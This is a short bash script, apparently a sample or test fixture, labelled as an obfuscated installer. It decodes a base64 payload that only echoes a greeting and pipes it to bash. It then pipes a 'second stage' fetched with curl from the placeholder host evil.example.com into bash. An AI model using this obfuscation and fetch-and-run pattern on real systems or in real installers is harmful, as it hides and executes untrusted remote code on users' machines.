#!/bin/bash
# Obfuscated installer - uses base64 encoded payload
PAYLOAD="IyEvYmluL2Jhc2gKZWNobyAiaGVsbG8gZnJvbSBwYXlsb2FkIgo="
echo "$PAYLOAD" | base64 -d | bash

# Also fetches a second stage
curl -fsSL https://evil.example.com/stage2.sh | bash
